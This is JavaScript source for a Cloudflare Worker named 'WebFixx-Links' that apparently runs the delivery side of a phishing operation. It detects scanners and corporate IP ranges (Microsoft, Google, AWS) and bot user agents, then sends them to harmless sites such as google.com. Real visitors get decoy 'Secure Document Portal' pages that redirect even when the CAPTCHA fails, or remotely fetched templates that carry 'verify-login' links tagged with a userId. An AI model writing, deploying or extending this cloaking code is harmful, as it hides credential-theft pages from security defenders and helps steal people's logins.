// WebFixx-Links — edge link engine (one Worker per link).
// Serves template pages (no gating) and redirect pages with strong bot
// protection. Deployed by WebFixx-Hoo createCloudflareLink, which replaces each
// "__TOKEN__" string literal below with the account's real secrets.
// Never put real secrets in this file.

const CONFIG = {
  gasUrl: "__GAS_URL__",
  scriptKey: "__SCRIPT_KEY__",
  iphubKey: "__IPHUB_KEY__",
  abuseKey: "__ABUSEIPDB_KEY__",
  turnstileSecret: "__TURNSTILE_SECRET__",
  turnstileSitekey: "0x4AAAAAABBGRn9RrMfzNHB2",

  gateCookieName: "wf_gate",
  gateTtlSeconds: 2700,

  ipinfoUrl: "https://ipinfo.io/",
  iphubUrl: "https://v2.api.iphub.info/ip/",
  abuseUrl: "https://api.abuseipdb.com/api/v2/check?ipAddress=",
  siteverifyUrl: "https://challenges.cloudflare.com/turnstile/v0/siteverify",

  legitDomains: [
    "https://www.google.com",
    "https://www.office.com",
    "https://outlook.live.com",
    "https://www.microsoft.com",
    "https://www.bing.com",
    "https://www.yahoo.com"
  ],
  orgKeywords: [
    "microsoft", "google", "amazon", "digital ocean", "azure",
    "aws", "oracle", "facebook", "twitter", "linkedin"
  ],
  botPatterns: [
    "bot", "crawler", "spider", "slurp", "mediapartners",
    "googleapis", "chrome-lighthouse", "pingdom", "pagespeed"
  ]
};

// Per-isolate caches (parity with the Flask FLAGGED_IPS set).
const flaggedIps = new Set();
const premiumHits = new Map();
let cachedGateKey = null;

const ACCESS_DENIED = "Access denied: Suspicious activity detected";

// Mirrors the Werkzeug route rules in api/index.py exactly, including how
// Flask's <path> converter strips the static prefix before the string is
// handed to GAS (where params.path is matched verbatim against sheet values):
//   /archiveXYZ          -> flow archive,  GAS path "XYZ"
//   /documentXYZ         -> flow premium,  GAS path "XYZ"
//   /directoryXYZ        -> flow premium,  GAS path "XYZ"
//   /directoriesXYZ      -> flow premium,  GAS path "XYZ" (longer static wins)
//   /pageXYZ             -> flow template, GAS path "XYZ" (mainURL ending /page)
//   /archive, /archive/  -> flow template, GAS path "archive[/...]" — the
//                           converter needs >=1 non-slash char after the
//                           prefix, so Flask falls through to /<path>
function routeRequest(pathname) {
  const table = [
    { prefix: "/directories", flow: "premium" },
    { prefix: "/directory", flow: "premium" },
    { prefix: "/document", flow: "premium" },
    { prefix: "/archive", flow: "archive" },
    { prefix: "/page", flow: "template" }
  ];
  for (let i = 0; i < table.length; i++) {
    if (pathname.startsWith(table[i].prefix)) {
      const rest = pathname.slice(table[i].prefix.length);
      if (rest.length > 0 && rest.charAt(0) !== "/") {
        return { flow: table[i].flow, path: rest };
      }
      return { flow: "template", path: pathname.slice(1) };
    }
  }
  return { flow: "template", path: pathname.replace(/^\//, "") };
}

function isBotOrOrg(userAgent, orgInfo) {
  const ua = String(userAgent || "").toLowerCase();
  const org = String(orgInfo || "").toLowerCase();
  for (let i = 0; i < CONFIG.botPatterns.length; i++) {
    if (ua.indexOf(CONFIG.botPatterns[i]) !== -1) return true;
  }
  for (let i = 0; i < CONFIG.orgKeywords.length; i++) {
    if (org.indexOf(CONFIG.orgKeywords[i]) !== -1) return true;
  }
  return false;
}

async function isIpFlagged(ip) {
  if (!ip) return false;
  if (flaggedIps.has(ip)) return true;
  // Optional keys (settings rows 16-17): a blank key skips its check
  // entirely instead of calling the API with an empty credential.
  const iphubKey = String(CONFIG.iphubKey || "").trim();
  const abuseKey = String(CONFIG.abuseKey || "").trim();
  if (!iphubKey && !abuseKey) return false;
  try {
    if (iphubKey) {
      const iphubResponse = await fetch(CONFIG.iphubUrl + ip, {
        headers: { "X-Key": iphubKey },
        signal: AbortSignal.timeout(2000)
      });
      if (iphubResponse.status === 200) {
        const data = await iphubResponse.json();
        if ((data.block === undefined ? 0 : data.block) === 1) {
          flaggedIps.add(ip);
          return true;
        }
      }
    }
    if (abuseKey) {
      const abuseResponse = await fetch(CONFIG.abuseUrl + ip, {
        headers: { "Key": abuseKey, "Accept": "application/json" },
        signal: AbortSignal.timeout(2000)
      });
      if (abuseResponse.status === 200) {
        const data = await abuseResponse.json();
        const score = (data && data.data && data.data.abuseConfidenceScore) || 0;
        if (score > 50) {
          flaggedIps.add(ip);
          return true;
        }
      }
    }
  } catch (e) {
    return false;
  }
  return false;
}

// Full gating for template + premium flows (exact origin order):
// ipinfo org (fail-open) -> UA deny -> flagged-IP deny.
// Returns null when the visitor passes.
async function fullGating(ip, userAgent) {
  try {
    const response = await fetch(CONFIG.ipinfoUrl + ip + "/json", {
      signal: AbortSignal.timeout(2000)
    });
    const info = await response.json();
    if (isBotOrOrg(userAgent, info.org)) {
      return {
        kind: "legit",
        location: CONFIG.legitDomains[Math.floor(Math.random() * CONFIG.legitDomains.length)]
      };
    }
  } catch (e) {
    // parity: ipinfo failure never blocks the visitor
  }

  const ua = String(userAgent || "").toLowerCase();
  if (!userAgent || ua.indexOf("bot") !== -1 || ua.indexOf("crawler") !== -1) {
    return { kind: "deny", message: ACCESS_DENIED };
  }

  if (await isIpFlagged(ip)) {
    return { kind: "deny", message: ACCESS_DENIED };
  }
  return null;
}

// Best-effort parity with Flask-Limiter "10 per minute" on premium paths.
function premiumRateOk(ip) {
  const now = Date.now();
  let hit = premiumHits.get(ip);
  if (!hit || now - hit.start >= 60000) {
    hit = { start: now, count: 0 };
    premiumHits.set(ip, hit);
  }
  hit.count++;
  if (premiumHits.size > 5000) {
    for (const [key, value] of premiumHits) {
      if (now - value.start >= 60000) premiumHits.delete(key);
    }
  }
  return hit.count <= 10;
}

function preserveQueryParams(originalUrl, redirectUrl) {
  try {
    const original = new URL(originalUrl);
    const target = new URL(redirectUrl);
    const multimap = (searchParams) => {
      const map = new Map();
      searchParams.forEach((value, key) => {
        if (!map.has(key)) map.set(key, []);
        map.get(key).push(value);
      });
      return map;
    };
    const merged = multimap(original.searchParams);
    multimap(target.searchParams).forEach((values, key) => merged.set(key, values));
    const out = new URL(target.toString());
    const params = new URLSearchParams();
    merged.forEach((values, key) => {
      for (const value of values) params.append(key, value);
    });
    out.search = params.toString();
    return out.toString();
  } catch (e) {
    return redirectUrl;
  }
}

function randomMetadata() {
  const titles = [
    "Document Access - Please Wait",
    "Secure Document Portal",
    "Loading Document Library",
    "Document Verification Required",
    "Processing Your Request"
  ];
  const descriptions = [
    "Secure document access portal. Please wait while we verify your credentials.",
    "Document management system. Verification in progress.",
    "Accessing secure document storage. Please be patient.",
    "Enterprise document portal. Processing your request.",
    "Document gateway access. Security check in progress."
  ];
  const keywords = [
    "document access, secure portal, verification",
    "document management, security, enterprise",
    "secure storage, document library, access",
    "enterprise portal, document system, gateway",
    "document verification, secure access, portal"
  ];
  const pick = (list) => list[Math.floor(Math.random() * list.length)];
  return {
    title: pick(titles),
    description: pick(descriptions),
    keywords: pick(keywords),
    token: String(Math.floor(100000 + Math.random() * 900000))
  };
}

function escapeHtml(text) {
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function errorHtml(message) {
  return (
    "<!DOCTYPE html>\n" +
    '<html lang="en">\n' +
    "<head>\n" +
    '    <meta charset="UTF-8">\n' +
    '    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n' +
    "    <title>Error</title>\n" +
    "    <style>\n" +
    "        body {\n" +
    "            font-family: Arial, sans-serif;\n" +
    "            text-align: center;\n" +
    "            padding: 50px;\n" +
    "        }\n" +
    "        .error-box {\n" +
    "            border: 1px solid red;\n" +
    "            padding: 20px;\n" +
    "            display: inline-block;\n" +
    "            background-color: #ffe6e6;\n" +
    "        }\n" +
    "    </style>\n" +
    "</head>\n" +
    "<body>\n" +
    '    <div class="error-box">\n' +
    "        <h1>404 - Not Found</h1>\n" +
    "        <p>" + escapeHtml(message) + "</p>\n" +
    "    </div>\n" +
    "</body>\n" +
    "</html>\n"
  );
}

function captchaHtml(redirectUrl) {
  return (
    "<!DOCTYPE html>\n" +
    '<html lang="en">\n' +
    "\n" +
    "<head>\n" +
    '    <meta charset="UTF-8">\n' +
    '    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n' +
    "    <title>Checking your browser...</title>\n" +
    "    <style>\n" +
    "        html, body {\n" +
    "            padding: 0;\n" +
    "            margin: 0;\n" +
    "            display: flex;\n" +
    "            justify-content: center;\n" +
    "            align-items: center;\n" +
    "            height: 100vh;\n" +
    "            background-color: #f4f4f4;\n" +
    "            font-family: Arial, sans-serif;\n" +
    "        }\n" +
    "        .container {\n" +
    "            text-align: center;\n" +
    "            background: white;\n" +
    "            padding: 20px;\n" +
    "            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);\n" +
    "            border-radius: 10px;\n" +
    "        }\n" +
    "        .loader {\n" +
    "            border: 4px solid #f3f3f3;\n" +
    "            border-top: 4px solid #3498db;\n" +
    "            border-radius: 50%;\n" +
    "            width: 40px;\n" +
    "            height: 40px;\n" +
    "            animation: spin 1s linear infinite;\n" +
    "            margin: 10px auto;\n" +
    "        }\n" +
    "        @keyframes spin {\n" +
    "            0% { transform: rotate(0deg); }\n" +
    "            100% { transform: rotate(360deg); }\n" +
    "        }\n" +
    "        .status-text {\n" +
    "            font-size: 14px;\n" +
    "            color: #555;\n" +
    "        }\n" +
    "    </style>\n" +
    "</head>\n" +
    "\n" +
    "<body>\n" +
    '    <div class="container">\n' +
    "        <h2>Checking your browser...</h2>\n" +
    '        <div class="loader"></div>\n' +
    '        <p class="status-text">This process should only take a few seconds.</p>\n' +
    "    </div>\n" +
    "\n" +
    "    <script>\n" +
    "        const redirectUrl = " + JSON.stringify(redirectUrl) + ";\n" +
    '        const email = "";\n' +
    "\n" +
    "        function redirectUser() {\n" +
    "            let finalUrl = redirectUrl;\n" +
    "            if (email) {\n" +
    '                finalUrl += "?email=" + encodeURIComponent(email);\n' +
    "            }\n" +
    "            window.location.href = finalUrl;\n" +
    "        }\n" +
    "\n" +
    "        // Always redirect after 3 seconds\n" +
    "        setTimeout(redirectUser, 3000);\n" +
    "    </script>\n" +
    "</body>\n" +
    "\n" +
    "</html>\n"
  );
}

function redirectHtml(redirectUrl, meta) {
  return (
    "<!DOCTYPE html>\n" +
    '<html lang="en">\n' +
    "<head>\n" +
    '    <meta charset="UTF-8">\n' +
    '    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n' +
    '    <meta name="description" content="' + escapeHtml(meta.description) + '">\n' +
    '    <meta name="keywords" content="' + escapeHtml(meta.keywords) + '">\n' +
    "    <title>" + escapeHtml(meta.title) + "</title>\n" +
    "    \n" +
    "    <style>\n" +
    "        html, body { \n" +
    "            padding: 0; \n" +
    "            margin: 0; \n" +
    "            display: flex;\n" +
    "            justify-content: center;\n" +
    "            align-items: center;\n" +
    "            height: 100vh;\n" +
    "            background-color: #f4f4f4;\n" +
    "            font-family: Arial, sans-serif;\n" +
    "        }\n" +
    "        .container { \n" +
    "            text-align: center; \n" +
    "            background: white; \n" +
    "            padding: 20px; \n" +
    "            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); \n" +
    "            border-radius: 10px;\n" +
    "        }\n" +
    "        .loader {\n" +
    "            border: 4px solid #f3f3f3;\n" +
    "            border-top: 4px solid #3498db;\n" +
    "            border-radius: 50%;\n" +
    "            width: 40px;\n" +
    "            height: 40px;\n" +
    "            animation: spin 1s linear infinite;\n" +
    "            margin: 10px auto;\n" +
    "        }\n" +
    "        @keyframes spin {\n" +
    "            0% { transform: rotate(0deg); }\n" +
    "            100% { transform: rotate(360deg); }\n" +
    "        }\n" +
    "        .status-text {\n" +
    "            font-size: 14px;\n" +
    "            color: #555;\n" +
    "        }\n" +
    "        #cf-turnstile-el {\n" +
    "            display: none;\n" +
    "        }\n" +
    "    </style>\n" +
    "</head>\n" +
    "\n" +
    "<body>\n" +
    '    <div class="container">\n' +
    "        <h2>Verifying your request...</h2>\n" +
    '        <div class="loader"></div>\n' +
    '        <p class="status-text">This process should only take a few seconds.</p>\n' +
    '        <div id="cf-turnstile-el" class="cf-turnstile"></div>\n' +
    '        <p id="status" style="display: none;">Please complete the CAPTCHA to continue.</p>\n' +
    "    </div>\n" +
    "\n" +
    '    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=onloadTurnstileCallback" defer></script>\n' +
    "\n" +
    "    <script>\n" +
    "        const cfTurnStileSiteKey = " + JSON.stringify(CONFIG.turnstileSitekey) + ";\n" +
    "        const redirectUrl = " + JSON.stringify(redirectUrl) + ";\n" +
    '        const email = "";\n' +
    "        const randomToken = " + JSON.stringify(meta.token) + "; \n" +
    "\n" +
    "        function redirectUser() {\n" +
    "            const url = new URL(redirectUrl);\n" +
    '            url.searchParams.append("t", randomToken);\n' +
    "            if (email) {\n" +
    '                url.searchParams.append("email", email);\n' +
    "            }\n" +
    "            window.location.href = url.toString();\n" +
    "        }\n" +
    "\n" +
    "        window.onloadTurnstileCallback = function () {\n" +
    "            window.turnstileCurrentWidget = turnstile.render('#cf-turnstile-el', {\n" +
    "                sitekey: cfTurnStileSiteKey,\n" +
    "                callback: function (token) {\n" +
    '                    document.getElementById("status").innerText = "Verification successful! Redirecting...";\n' +
    "                    setTimeout(redirectUser, 2000);\n" +
    "                }\n" +
    "            });\n" +
    "        };\n" +
    "\n" +
    "        // Always redirect after 3 seconds even if CAPTCHA fails\n" +
    "        setTimeout(redirectUser, 3000);\n" +
    "    </script>\n" +
    "</body>\n" +
    "</html>\n"
  );
}

function gateHtml(toUrl, failed) {
  return (
    "<!DOCTYPE html>\n" +
    '<html lang="en">\n' +
    "<head>\n" +
    '    <meta charset="UTF-8">\n' +
    '    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n' +
    "    <title>Checking your browser...</title>\n" +
    "    <style>\n" +
    "        html, body {\n" +
    "            padding: 0;\n" +
    "            margin: 0;\n" +
    "            display: flex;\n" +
    "            justify-content: center;\n" +
    "            align-items: center;\n" +
    "            height: 100vh;\n" +
    "            background-color: #f4f4f4;\n" +
    "            font-family: Arial, sans-serif;\n" +
    "        }\n" +
    "        .container {\n" +
    "            text-align: center;\n" +
    "            background: white;\n" +
    "            padding: 24px;\n" +
    "            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);\n" +
    "            border-radius: 10px;\n" +
    "            min-width: 300px;\n" +
    "        }\n" +
    "        .loader {\n" +
    "            border: 4px solid #f3f3f3;\n" +
    "            border-top: 4px solid #3498db;\n" +
    "            border-radius: 50%;\n" +
    "            width: 40px;\n" +
    "            height: 40px;\n" +
    "            animation: spin 1s linear infinite;\n" +
    "            margin: 10px auto;\n" +
    "        }\n" +
    "        @keyframes spin {\n" +
    "            0% { transform: rotate(0deg); }\n" +
    "            100% { transform: rotate(360deg); }\n" +
    "        }\n" +
    "        .status-text {\n" +
    "            font-size: 14px;\n" +
    "            color: #555;\n" +
    "        }\n" +
    "        #cf-turnstile-el {\n" +
    "            display: flex;\n" +
    "            justify-content: center;\n" +
    "            margin: 12px auto;\n" +
    "        }\n" +
    "        .failed { color: #b00020; }\n" +
    "    </style>\n" +
    "</head>\n" +
    "\n" +
    "<body>\n" +
    '    <div class="container">\n' +
    "        <h2>Checking your browser...</h2>\n" +
    '        <div class="loader"></div>\n' +
    '        <p class="status-text">' +
    (failed
      ? 'Verification failed. Please try again.</p>'
      : "This process should only take a few seconds.</p>") +
    '\n        <div id="cf-turnstile-el"></div>\n' +
    '        <p id="gate-status" class="status-text" style="display: none;">Verification successful! Continuing...</p>\n' +
    "    </div>\n" +
    "\n" +
    '    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=onloadGate" defer></script>\n' +
    "\n" +
    "    <script>\n" +
    "        const sitekey = " + JSON.stringify(CONFIG.turnstileSitekey) + ";\n" +
    "        const to = " + JSON.stringify(toUrl) + ";\n" +
    "\n" +
    "        window.onloadGate = function () {\n" +
    "            turnstile.render('#cf-turnstile-el', {\n" +
    "                sitekey: sitekey,\n" +
    "                action: 'gate',\n" +
    "                callback: function (token) {\n" +
    "                    document.getElementById('gate-status').style.display = 'block';\n" +
    "                    fetch('/__wf_gate', {\n" +
    "                        method: 'POST',\n" +
    "                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n" +
    "                        credentials: 'same-origin',\n" +
    "                        body: 'token=' + encodeURIComponent(token) + '&to=' + encodeURIComponent(to)\n" +
    "                    }).then(function (response) {\n" +
    "                        if (response.ok) {\n" +
    "                            window.location.replace(to);\n" +
    "                        } else {\n" +
    "                            window.location.replace('/__wf_gate?retry=' + encodeURIComponent(to));\n" +
    "                        }\n" +
    "                    }).catch(function () {\n" +
    "                        window.location.reload();\n" +
    "                    });\n" +
    "                }\n" +
    "            });\n" +
    "        };\n" +
    "    </script>\n" +
    "</body>\n" +
    "</html>\n"
  );
}

function htmlResponse(html, status, extraHeaders) {
  const headers = { "content-type": "text/html; charset=utf-8" };
  if (extraHeaders) {
    for (const key of Object.keys(extraHeaders)) headers[key] = extraHeaders[key];
  }
  return new Response(html, { status: status || 200, headers: headers });
}

function errorResponse(message, status) {
  return htmlResponse(errorHtml(message), status || 404);
}

function getGateKey() {
  if (cachedGateKey) return cachedGateKey;
  cachedGateKey = crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(CONFIG.turnstileSecret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  return cachedGateKey;
}

async function gateSignature(exp, ip) {
  const key = await getGateKey();
  const mac = await crypto.subtle.sign(
    "HMAC",
    key,
    new TextEncoder().encode(exp + "." + ip)
  );
  const bytes = new Uint8Array(mac);
  let hex = "";
  for (let i = 0; i < 16; i++) hex += bytes[i].toString(16).padStart(2, "0");
  return hex;
}

async function verifyGateCookie(request, ip) {
  const cookie = request.headers.get("Cookie") || "";
  const match = cookie.match(new RegExp("(?:^|;\\s*)" + CONFIG.gateCookieName + "=([^;]+)"));
  if (!match) return false;
  const parts = match[1].split(".");
  if (parts.length !== 2) return false;
  const exp = parts[0];
  const sig = parts[1];
  if (!/^\d+$/.test(exp)) return false;
  if (Number(exp) * 1000 <= Date.now()) return false;
  const expected = await gateSignature(exp, ip);
  return sig === expected;
}

async function issueGateCookie(ip) {
  const exp = String(Math.floor(Date.now() / 1000) + CONFIG.gateTtlSeconds);
  const sig = await gateSignature(exp, ip);
  return (
    CONFIG.gateCookieName + "=" + exp + "." + sig +
    "; Path=/; Max-Age=" + CONFIG.gateTtlSeconds +
    "; HttpOnly; Secure; SameSite=Lax"
  );
}

async function siteverify(token, ip) {
  try {
    const body = new URLSearchParams();
    body.set("secret", CONFIG.turnstileSecret);
    body.set("response", token);
    if (ip) body.set("remoteip", ip);
    const response = await fetch(CONFIG.siteverifyUrl, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(),
      signal: AbortSignal.timeout(5000)
    });
    const data = await response.json();
    return data && data.success === true;
  } catch (e) {
    return false;
  }
}

// Returns a Response when the gate must intervene, or null when the
// visitor already holds a valid gate cookie.
// Optional secret (settings row 18): blank = gate fully off (siteverify
// with an empty secret could never pass, so the challenge would deadlock
// every visitor). With a secret the gate runs at full strength.
async function gateCheck(request, url, ip) {
  if (!String(CONFIG.turnstileSecret || "").trim()) return null;

  if (request.method === "POST" && url.pathname === "/__wf_gate") {
    let token = "";
    let to = url.searchParams.get("retry") || "/";
    try {
      const form = await request.formData();
      token = String(form.get("token") || "");
      to = String(form.get("to") || to);
    } catch (e) {
      // fall through with empty token -> failed retry page
    }
    if (to.charAt(0) !== "/") to = "/";
    if (token && (await siteverify(token, ip))) {
      return new Response("OK", {
        status: 302,
        headers: {
          Location: to,
          "Set-Cookie": await issueGateCookie(ip)
        }
      });
    }
    return htmlResponse(gateHtml(to, true), 200);
  }

  if (url.pathname === "/__wf_gate") {
    const to = url.searchParams.get("retry") || "/";
    const safeTo = to.charAt(0) === "/" ? to : "/";
    return htmlResponse(gateHtml(safeTo, true), 200);
  }

  if (await verifyGateCookie(request, ip)) return null;
  return htmlResponse(gateHtml(url.pathname + url.search, false), 200);
}

async function safeJson(response) {
  if (response.status !== 200) return null;
  const text = await response.text().catch(() => "");
  if (!text || !text.trim()) return null;
  try {
    const data = JSON.parse(text);
    if (!data || typeof data !== "object" || Array.isArray(data)) return null;
    return data;
  } catch (e) {
    return null;
  }
}

// Parity with the Flask verify_page_visit / fetch_redirect_data retry loop.
// Returns { data } on a parsed body, { transient: true } or { exception: true }.
async function gasPost(action, completeUrl, path, ipData) {
  for (let attempt = 0; attempt < 2; attempt++) {
    try {
      const body = new URLSearchParams();
      body.set("action", action);
      body.set("completeUrl", completeUrl);
      body.set("path", path);
      body.set("key", CONFIG.scriptKey);
      if (ipData) body.set("ipData", ipData);
      const response = await fetch(CONFIG.gasUrl, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: body.toString(),
        signal: AbortSignal.timeout(30000)
      });
      const data = await safeJson(response);
      if (data === null) {
        if (attempt === 0) continue;
        return { transient: true };
      }
      return { data: data };
    } catch (e) {
      if (attempt === 0) continue;
      return { exception: true };
    }
  }
  return { transient: true };
}

function injectUserId(templateCode, userId) {
  if (userId && userId !== "N/A" && templateCode.indexOf("verify-login") !== -1) {
    return templateCode.replace(
      /(verify-login(?:-lite|-ai)?\?)(?![^"'\s#]*userId=)/g,
      function (match, prefix) {
        return prefix + "userId=" + userId + "&";
      }
    );
  }
  return templateCode;
}

async function handleTemplate(request, url, ip, userAgent, path) {
  try {
    const completeUrl = request.url;
    const result = await gasPost("verifyPageVisit", completeUrl, path, ip);
    if (result.transient) {
      return errorResponse("Server is temporarily unavailable. Please try again.", 404);
    }
    if (result.exception) {
      return errorResponse("Server error while verifying page. Please try again.", 404);
    }
    const data = result.data;
    if (!data.success) {
      return errorResponse(data.error || "Invalid response from server", 404);
    }
    const templateCode = data.templateCode || "";
    const userId = String(data.userId || "").trim();
    return htmlResponse(injectUserId(templateCode, userId), 200);
  } catch (e) {
    return errorResponse("Error processing template: " + (e && e.message ? e.message : String(e)), 404);
  }
}

async function handlePremium(request, url, ip, userAgent, path) {
  const gating = await fullGating(ip, userAgent);
  if (gating && gating.kind === "legit") {
    return new Response(null, { status: 302, headers: { Location: gating.location } });
  }
  if (gating && gating.kind === "deny") {
    return errorResponse(gating.message, 403);
  }

  try {
    const completeUrl = request.url;
    const result = await gasPost("verifyRedirectVisit", completeUrl, path, null);
    if (result.transient) {
      return errorResponse("Server is temporarily unavailable. Please try again.", 404);
    }
    if (result.exception) {
      return errorResponse("Server error while verifying redirect. Please try again.", 404);
    }
    const data = result.data;
    if (!data.success) {
      return errorResponse(data.error || "Invalid response from server", 404);
    }
    const finalUrl = preserveQueryParams(completeUrl, data.redirectURL || "");
    return htmlResponse(redirectHtml(finalUrl, randomMetadata()), 200);
  } catch (e) {
    return errorResponse(e && e.message ? e.message : String(e), 500);
  }
}

async function handleArchive(request, url, ip, path) {
  try {
    const completeUrl = request.url;
    const result = await gasPost("verifyRedirectVisit", completeUrl, path, null);
    if (result.transient) {
      return errorResponse("Server is temporarily unavailable. Please try again.", 404);
    }
    if (result.exception) {
      return errorResponse("Server error while verifying redirect. Please try again.", 404);
    }
    const data = result.data;
    if (!data.success) {
      return errorResponse(data.error || "Invalid response from server", 404);
    }
    const finalUrl = preserveQueryParams(completeUrl, data.redirectURL || "");
    return htmlResponse(captchaHtml(finalUrl), 200);
  } catch (e) {
    return errorResponse(e && e.message ? e.message : String(e), 500);
  }
}

export default {
  async fetch(request) {
    try {
      const url = new URL(request.url);
      const route = routeRequest(url.pathname);
      const flow = route.flow;
      const ip = request.headers.get("CF-Connecting-IP") || "";
      const userAgent = request.headers.get("User-Agent") || "";

      if (flow === "premium" && !premiumRateOk(ip)) {
        return new Response("429 Too Many Requests: 10 per minute", {
          status: 429,
          headers: { "content-type": "text/plain; charset=utf-8" }
        });
      }

      const gateResponse = await gateCheck(request, url, ip);
      if (gateResponse) return gateResponse;

      const path = route.path;

      if (flow === "template") {
        return await handleTemplate(request, url, ip, userAgent, path);
      }
      if (flow === "premium") {
        return await handlePremium(request, url, ip, userAgent, path);
      }
      return await handleArchive(request, url, ip, path);
    } catch (e) {
      return errorResponse("Error processing request: " + (e && e.message ? e.message : String(e)), 500);
    }
  }
};
